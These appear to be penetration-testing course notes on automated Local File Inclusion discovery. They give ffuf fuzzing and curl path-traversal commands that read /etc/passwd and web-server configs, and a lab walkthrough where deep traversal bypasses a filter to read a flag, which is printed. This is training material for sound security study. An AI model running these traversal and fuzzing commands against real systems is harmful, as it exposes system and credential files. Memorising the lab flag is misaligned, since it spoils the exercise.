# Section 9 — Automated LFI Scanning

---

## When to Use Automation

Manual exploitation is more reliable and finds bugs that automation misses. But automation is useful for:
- Wide-net testing across many parameters and endpoints
- Trying every known bypass payload in seconds
- Finding hidden parameters not exposed in the UI
- Quickly mapping server files (webroot, logs, configs)

Three steps: **fuzz parameters → fuzz LFI (Local File Inclusion) payloads → fuzz server files**.

---

## Step 1 — Fuzz Parameters

Hidden GET/POST parameters are often less hardened than form-exposed ones. Use `burp-parameter-names.txt`:

```bash
# Baseline page size first
SIZE=$(curl -sk "http://TARGET/index.php" | wc -c)

# Fuzz GET params
ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u "http://TARGET/index.php?FUZZ=test" \
     -fs $SIZE -t 50 -of csv -o /tmp/param.csv

# Anything with a different size = candidate parameter
awk -F, 'NR>1 && $5!=""' /tmp/param.csv
```
> Gets the baseline response size, then fuzzes GET parameter names. The `-fs` flag filters out responses matching the baseline size, so only pages that actually reacted to the parameter are shown. Results saved to CSV for review.

Also try POST:
```bash
ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -X POST -d "FUZZ=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u "http://TARGET/index.php" -fs $SIZE
```
> Same fuzz but for POST parameters. The `-X POST` and `-d` flags send form data. Use both GET and POST fuzzing since hidden parameters may exist in either method.

---

## Step 2 — Fuzz LFI Payloads

The `LFI-Jhaddix.txt` wordlist contains hundreds of bypass variants — encoded traversal, recursive payloads, alternate separators.

```bash
ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u "http://TARGET/index.php?view=FUZZ" \
     -fs $BASELINE_SIZE -t 50
```
> Fuzzes the `view` parameter with every LFI payload in Jhaddix's list. Filters out baseline-sized responses. Any result with a different size likely shows file content. Swap `view` for the parameter name you discovered in Step 1.

Other available LFI wordlists on Kali:
| Wordlist | Path | Use |
|----------|------|-----|
| LFI-Jhaddix | `~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt` | 900+ payloads, comprehensive |
| LFI-gracefulsecurity-linux | `LFI-gracefulsecurity-linux.txt` | Linux-specific paths |
| LFI-gracefulsecurity-windows | `LFI-gracefulsecurity-windows.txt` | Windows paths |
| LFI-LFISuite-pathtotest-huge | `LFI-LFISuite-pathtotest-huge.txt` | Huge — LFISuite's full list |
| LFI-Windows-adeadfed | `LFI-Windows-adeadfed.txt` | Curated Windows LFI |
| LFI-etc-files | `LFI-etc-files-of-all-linux-packages.txt` | Every `/etc/` file from Debian package db |

---

## Step 3 — Fuzz Server Files

Once LFI is confirmed, enumerate the server's webroot, configs, and logs.

### Find the webroot
```bash
ffuf -w ~/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u "http://TARGET/index.php?view=../../../../FUZZ/index.php" \
     -fs $BASELINE_SIZE
```
> Brute-forces common webroot paths through the LFI parameter — a non-baseline size means that webroot resolved. Swap `view`, `TARGET`, and `$BASELINE_SIZE` for your target.

Common Linux webroots:
```
/var/www/html/         ← Apache default (Debian)
/var/www/              ← Generic
/srv/www/              ← Older Debian, openSUSE
/usr/local/apache2/htdocs/
/var/apache2/htdocs/
```

Common Windows:
```
C:\xampp\htdocs\
C:\inetpub\wwwroot\
C:\Program Files\Apache\htdocs\
```

### Find logs / configs
```bash
# Use the etc-files-of-all-linux-packages wordlist (huge but comprehensive):
ffuf -w ~/SecLists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt:FUZZ \
     -u "http://TARGET/index.php?view=../../../../FUZZ" \
     -fs $BASELINE_SIZE
```
> Fuzzes for every known `/etc/` file from Debian package metadata. Any response with a size different from baseline contains a real file. Slower than a short list but very thorough.

Read Apache config to find webroot + log paths:
```bash
curl "http://TARGET/index.php?view=../../../../etc/apache2/apache2.conf"
# DocumentRoot /var/www/html
# ErrorLog ${APACHE_LOG_DIR}/error.log
# CustomLog ${APACHE_LOG_DIR}/access.log combined

curl "http://TARGET/index.php?view=../../../../etc/apache2/envvars"
# export APACHE_LOG_DIR=/var/log/apache2
```
> Reads the Apache main config to find the webroot and log file paths. Then reads `envvars` to resolve `${APACHE_LOG_DIR}` to a real path. Use these paths for log poisoning.

### Cross-reference for nginx:
```bash
curl "http://TARGET/index.php?view=../../../../etc/nginx/nginx.conf"
curl "http://TARGET/index.php?view=../../../../etc/nginx/sites-enabled/default"
```
> Reads nginx config files to find the webroot and log paths. The `sites-enabled/default` file shows the active virtual host config including `access_log` and `root` directives.

---

## LFI Tools (mostly Python 2, often broken)

| Tool | Repo | Status |
|------|------|--------|
| LFISuite | github.com/D35m0nd142/LFISuite | Python 2, unmaintained |
| LFiFreak | github.com/OsandaMalith/LFiFreak | Python 2 |
| liffy | github.com/mzfr/liffy | Python 3, somewhat maintained |
| dotdotpwn | apt: `dotdotpwn` | Perl, still works for traversal probes |

In practice, `ffuf` + manual exploitation beats every dedicated LFI tool. Skip these unless you have a very specific use case.

---

## Lab — Automated LFI Discovery

**Target:** `154.57.164.66:31212`

### Step 1 — Get baseline + fuzz parameters

```bash
# Baseline is 2309 bytes for empty index.php
ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u "http://154.57.164.66:31212/index.php?FUZZ=test" -fs 2309 -t 50
```
> Fuzzes every common GET parameter name. Responses with a different size from the baseline (2309) reacted to the parameter — those are candidates for further testing.

Hit: **`view`** (size 1935 — different from baseline)

### Step 2 — Test direct LFI on `view`

```bash
curl -sk "http://154.57.164.66:31212/index.php?view=../../../../etc/passwd"
# → no output — basic traversal is filtered/missing
```
> Confirms whether a simple 4-level traversal works. No output means the path is either filtered or the traversal depth is wrong.

### Step 3 — Fuzz with LFI-Jhaddix

```bash
ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u "http://154.57.164.66:31212/index.php?view=FUZZ" -fs 1935 -t 50
```
> Tries hundreds of LFI bypass variants including different traversal depths and encoding styles. Filters out the known non-LFI response size (1935) so only successful file reads appear.

Hits — multiple variants of `../../../../../etc/passwd` with **18+ traversal levels** worked:
```
../../../../../../../../../../../../../../../../../../../../../etc/passwd  [Size: 3309]
```

The pattern: shallower (4 levels) was filtered, but deeper traversal (18+ levels) bypassed.

### Step 4 — Read /flag.txt

```bash
curl -sk "http://154.57.164.66:31212/index.php?view=../../../../../../../../../../../../../../../../../../../../../flag.txt" \
  | grep -oE 'HTB\{[^}]+\}'
```
> Uses the 18-level traversal confirmed by ffuf to read `/flag.txt`. The `grep` extracts just the flag string from the surrounding HTML.

**Flag:** `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}`

> The flag name confirms the lesson: automation finds hidden gems (the `view` parameter wasn't linked anywhere visible).

---

## Exam Notes

- **Always fuzz hidden parameters** before assuming a page isn't vulnerable — `burp-parameter-names.txt` is the canonical wordlist
- Baseline-size filter (`-fs SIZE`) is essential — without it ffuf shows every request as a hit
- LFI-Jhaddix is the workhorse — covers traversal counts, encoding variants, and Linux/Windows paths in one list
- If `../../../../etc/passwd` fails, try 8+/12+/20+ levels — some filters check exact patterns or path lengths
- Use the **etc-files-of-all-linux-packages** list to enumerate every common config file at once (more thorough than guessing)
- Server logs + configs are the bridge between read-only LFI and RCE — always map them after gaining LFI
- LFI tools (LFISuite/liffy) are usually outdated — ffuf is faster and more flexible
